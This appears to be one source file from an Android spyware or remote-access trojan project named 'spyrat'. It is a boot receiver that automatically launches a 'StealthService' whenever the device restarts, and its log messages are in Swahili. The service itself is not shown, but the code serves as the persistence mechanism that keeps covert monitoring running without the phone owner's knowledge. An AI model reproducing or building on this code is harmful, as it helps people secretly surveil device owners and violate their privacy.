package com.spyrat.investigation;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "SpyratBoot";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Log.d(TAG, "🔰 Device imewashwa - Inaanzisha service...");
            
            // Start the stealth service on boot
            Intent serviceIntent = new Intent(context, StealthService.class);
            context.startService(serviceIntent);
            
            Log.d(TAG, "✅ Service imeanzishwa baada ya boot");
        }
    }
}
